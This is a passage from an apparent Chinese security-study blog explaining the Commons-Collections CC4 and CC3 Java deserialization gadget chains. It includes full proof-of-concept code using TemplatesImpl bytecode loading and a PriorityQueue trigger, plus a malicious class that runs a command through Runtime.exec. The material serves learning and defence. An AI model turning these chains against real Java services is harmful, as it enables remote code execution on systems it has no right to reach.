class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://14.Java/java test/CCtest/target/classes/org/example/test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes =&#123;code&#125; ;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>&lt;&gt;(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span> <span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span> <span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但有问题，在heapify()方法处打断点进行调试</p><p><img src="/2024/06/24/CC4/Users\28698\AppData\Roaming\Typora\typora-user-images\image-20240619222352442.png" alt="image-20240619222352442"></p><p>可以看到这里我们预想的是进入for循环，调用siftDown()，但这里我们size的值为0</p><blockquote><p>在Java中，”&gt;&gt;&gt;”是无符号右移运算符。它会将数字的二进制表示向右移动指定位数，左边用0填充。我们这里将size的值变为2即可满足</p></blockquote><p>随便填两个，将size的值增加到2即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">priorityQueue.<span class="built_in">add</span>(1);</span><br><span class="line">priorityQueue.<span class="built_in">add</span>(2);</span><br></pre></td></tr></table></figure><p>还是不行，因为add() -&gt; offer() -&gt; siftUp() -&gt; siftUpUsingComparator.compare()也会执行compare，这是本地执行的，并不是通过反序列化弹出的shell</p><p>先让transformingComparator为一个任意值，不为我们要调用的chainedTransformer，这样就不会触发add()本地执行那条链，add完后再将transformingComparator的值改回来即可</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最终poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://14.Java/java test/CCtest/target/classes/org/example/test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes =&#123;code&#125; ;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>&lt;&gt;(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将transformingComparator的值改回chainedTransformer</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformerField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformerField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformerField.set(transformingComparator,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span> <span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span> <span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用链：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">  -&gt;</span>PriorityQueue.heapify<span class="function"><span class="params">()</span>  </span></span><br><span class="line"><span class="function">    -&gt;</span>PriorityQueue.siftDown<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">      -&gt;</span>PriorityQueue.siftDownUsingComparator<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">        -&gt;</span>TransformingComparator.compare<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">          -&gt;</span>ChainedTransformer.transform<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">            -&gt;</span>InstantiateTransformer.transform<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">              -&gt;</span>TemplatesImpl.newTransformer<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">                -&gt;</span>defineClass<span class="function"><span class="params">()</span>-&gt;</span>newInstance<span class="function"><span class="params">()</span>-&gt;</span>test.<span class="keyword">class</span></span><br></pre></td></tr></table></figure><p>反向调用分析</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">后面和CC3一样</span><br><span class="line">-&gt;</span><br><span class="line">将chainedTransformer作为参数传入TransformingComparator.compare<span class="function"><span class="params">()</span>即可触发<span class="title">chainedTransformer</span>.<span class="title">transform</span><span class="params">()</span></span></span><br><span class="line"><span class="function">-&gt;</span></span><br><span class="line">PriorityQueue.siftDownUsingComparator<span class="function"><span class="params">()</span>调用传入参数<span class="title">comparator</span>的<span class="title">compare</span>方法，将参数设置为<span class="title">TransformingComparator</span>的实例即可调用<span class="title">TransformingComparator</span>.<span class="title">compare</span><span class="params">()</span></span></span><br><span class="line"><span class="function">-&gt;</span></span><br><span class="line">PriorityQueue.heapify<span class="function"><span class="params">()</span>触发<span class="title">PriorityQueue</span>.<span class="title">siftDown</span><span class="params">()</span>，进而调用<span class="title">PriorityQueue</span>.<span class="title">siftDownUsingComparator</span><span class="params">()</span></span></span><br><span class="line"><span class="function">-&gt;</span></span><br><span class="line">反序列化调用PriorityQueue.readObject()，触发PriorityQueue.heapify()</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://www.cnblogs.com/1vxyz/p/17473641.html">https://www.cnblogs.com/1vxyz/p/17473641.html</a></p><p><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.788&vd_source=d1346bdaaaf874724abaf92625935d94">https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.788&amp;vd_source=d1346bdaaaf874724abaf92625935d94</a></p><p><a href="https://www.cnblogs.com/F12-blog/p/18085593">https://www.cnblogs.com/F12-blog/p/18085593</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC3</title>
      <link href="/2024/06/24/CC3/"/>
      <url>/2024/06/24/CC3/</url>
      
        <content type="html"><![CDATA[<h1 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h1><p>前两条 CC1和CC6利用invoke反射调用Runtime().getRuntime().exec()执行命令 很多时候服务器的代码当中的黑名单会选择禁用 Runtime</p><p>CC3是利用类加载机制，动态加载恶意类来实现自动执行恶意类代码的</p><p>测试环境为：</p><p>jdk 8u65</p><p>Commons-Collections 3.2.1</p><h2 id="CC3构造"><a href="#CC3构造" class="headerlink" title="CC3构造"></a>CC3构造</h2><h3 id="TemplatesImpl分析"><a href="#TemplatesImpl分析" class="headerlink" title="TemplatesImpl分析"></a>TemplatesImpl分析</h3><p>这条链子是利用了ClassLoader中的defineClass()，这个方法负责从字节码中加载一个类，但只加载恶意类是不会执行代码的，还需要有个初始化的地方。</p><p>defineClass()往往都是protected类型的，只能通过反射去调用，所以我们现在需要找一个重写defineClass()且是public的</p><p>最后我们在TemplatesImpl类中找到 ，这个类存在一个内部类 TransletClassLoader 继承了 ClassLoader并且重写了 defineClass 方法，重写的defineClass方法可以被外部类调用</p><p><img src="/2024/06/24/CC3/Users\28698\Pictures\用qq自带图片编辑后\QQ图片20240613184756.png" alt="QQ图片20240613184756"></p><p>这个defineClass没有写作用域，说明只能内部调用，继续跟进，看在TemplatesImpl中哪里调用了defineClass，发现在defineTransletClasses方法中调用了defineClass，但defineTransletClasses是private</p><p>继续跟进，发现有三处都调用了，我们要用到的是getTransletInstance</p><p>![屏幕截图 2024-06-13 191143](C:\Users\28698\Pictures\Screenshots\屏幕截图 2024-06-13 191143.png)</p><p>它检查了_class是否为空，如果为空则赋值，并调用了newInstance()，也就是实例化，这里就相当于一个初始化的过程，满足我们的需要，待会就重点关注这里了，如果能用就相当于能动态执行我们的代码</p><p>但这个也是私有的，继续跟进，找到了newTransformer，这个是public</p><p>![屏幕截图 2024-06-13 192419](C:\Users\28698\Pictures\Screenshots\屏幕截图 2024-06-13 192419.png)</p><h3 id="TemplatesImpl利用"><a href="#TemplatesImpl利用" class="headerlink" title="TemplatesImpl利用"></a>TemplatesImpl利用</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>找到链子后就开始构造利用，链子就是正向来的了，先是newTransformer()</p><p><img src="/2024/06/24/CC3/Users\28698\AppData\Roaming\Typora\typora-user-images\image-20240613195521577.png" alt="image-20240613195521577"></p><p>会调用getTransletInstance，跟进</p><p>![屏幕截图 2024-06-13 195720](C:\Users\28698\Pictures\Screenshots\屏幕截图 2024-06-13 195720.png)</p><p>getTransletInstance中有两个if语句，如果<code>_name</code>为空则返回空，如果<code>_class</code>为空则调用defineTransletClasses，所以这里我们需要赋值 _name，不能赋值 _class</p><p><img src="/2024/06/24/CC3/Users\28698\AppData\Roaming\Typora\typora-user-images\image-20240613200018418.png" alt="image-20240613200018418"></p><p>看到这个类的构造函数啥都没有，所以待会需要我们自己赋值，继续跟进defineTransletClasses</p><p>![屏幕截图 2024-06-15 164809](C:\Users\28698\Pictures\Screenshots\屏幕截图 2024-06-15 164809.png)</p><p>这里如果<code>_bytecodes</code>为空则会抛出异常，所以我们要对其赋值，然后还要个<code>_tfactory</code>，是用来调用方法的，也需要赋值</p><h4 id="poc构造"><a href="#poc构造" class="headerlink" title="poc构造"></a>poc构造</h4><p>用反射给TemplatesImpl 的 <code>_name</code>、<code>_bytecodes</code>、<code>_tfactory</code> 赋值</p><p><code>_name</code>的值随便赋，类型是String</p><p><code>_bytecodes</code>的值就是我们要传入的恶意代码，<code>_bytecodes</code>的类型是个二维数组，defineClass中处理的是一个一维数组，可以先创个一维数组再套层二维数组，例如</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">byte[] code <span class="operator">=</span> Files.readAllBytes(Paths.get(<span class="string">&quot;test.class&quot;</span>))<span class="comment">;</span></span><br><span class="line">byte[][] codes <span class="operator">=</span>&#123;code&#125;<span class="comment">;</span></span><br></pre></td></tr></table></figure><p><code>_tfactory </code>较难赋值</p><p><code>private transient TransformerFactoryImpl _tfactory = null;</code>，<code>transient</code>表明该变量的生命周期仅局限于当前的运行环境，不会被写入到序列化的流中。readObject里有给它的赋值语句 <code>_tfactory = new TransformerFactoryImpl();</code>，还没序列化，所以先手动给<code>_tfactory</code>赋值</p><p>poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://14.Java/java test/CCtest/target/classes/org/example/test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.class</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title class_"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后发现报了一个空指针错误，打个断点调试一下</p><p><img src="/2024/06/24/CC3/Users\28698\AppData\Roaming\Typora\typora-user-images\image-20240615213724423.png" alt="image-20240615213724423"></p><p>这里判断父类是否名为ABSTRACT_TRANSLET，如果不是，则调用_auxClasses.put</p><p><img src="/2024/06/24/CC3/Users\28698\Pictures\用qq自带图片编辑后\QQ图片20240615213927.png" alt="QQ图片20240615213927"></p><p>继续走会发现<code>_auxClasses</code>的值为空，也就是这里报的空指针错误，故现在有两种处理方法，一是让其父类 equals ABSTRACT_TRANSLET，二是对<code>_auxClasses</code>赋一个值，我们注意到下面还有个判断</p><p><img src="/2024/06/24/CC3/Users\28698\Pictures\用qq自带图片编辑后\QQ图片20240615214358.png" alt="QQ图片20240615214358"></p><p>如果<code>_transletIndex</code>的值小于0就会报错</p><blockquote><p>当检查发现<code>_transletIndex</code>小于0时，代码会创建一个ErrorMsg实例，其中包含了一个错误信息NO_MAIN_TRANSLET_ERR，以及<code>_translet_</code>类的名称（_name）。这个ErrorMsg实例随后被转换为字符串，并用于构造一个TransformerConfigurationException异常。这个异常被抛出，中断了当前的执行流程，并将错误信息传递给了调用者，以便进一步处理或显示给用户。</p></blockquote><p>而我们看到此时<code>_transletIndex</code>为-1，所以这里我们只能用方法一了，也就是满足if条件，让其父类 equals ABSTRACT_TRANSLET，也就是说我们构造的类要继承AbstractTranslet类</p><p>而AbstractTranslet类是个抽象类，继承类要实现其所有方法，故修改test.class为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> 